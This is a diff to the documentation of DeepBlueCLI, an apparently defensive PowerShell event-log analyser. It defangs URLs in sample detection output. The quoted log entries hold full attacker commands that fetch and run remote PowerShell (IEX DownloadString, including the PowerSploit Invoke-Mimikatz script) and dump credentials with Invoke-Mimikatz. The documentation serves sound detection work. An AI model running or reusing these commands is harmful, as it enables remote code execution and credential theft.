@@ -1592,7 +1592,7 @@ Account Name:           jwright           7
 Account Name:           Administrator     7
 ```
 
-##PowerSploit (Security/System)
+## PowerSploit (Security/System)
 |Event|Command|
 |-----|-------|
 |PowerSploit (security)|`.\DeepBlue.ps1 .\evtx\powersploit-security.evtx`|
@@ -1606,8 +1606,7 @@ Message : Suspicious Command Line
 Results : Download via Net.WebClient DownloadString
           Command referencing Mimikatz
 
-Command : powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('http://eic.me/17'); Invoke-Mimikatz
-          -DumpCreds"
+Command : powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('hXXp://eic[.]me/17'); Invoke-Mimikatz -DumpCreds"
 Decoded :
 
 Date    : 9/20/2016 11:45:24 AM
@@ -1619,7 +1618,7 @@ Results : Download via Net.WebClient DownloadString
           PowerSploit Invoke-Mimikatz.ps1
           Use of PowerSploit
 
-Command : powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestat
+Command : powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('hxxps://raw[.]githubusercontent[.]com/mattifestat
           ion/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
 =================================================================================
 Date    : 9/20/2016 12:19:26 PM
@@ -1682,5 +1681,5 @@ Process Information:
         New Process Name:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
         Token Elevation Type:   TokenElevationTypeFull (2)
         Creator Process ID:     0xf14
-        Process Command Line:   powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('http://eic.me/17'); Invoke-Mimikatz -DumpCreds"
+        Process Command Line:   powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('hxxp://eic[.]me/17'); Invoke-Mimikatz -DumpCreds"
 ```
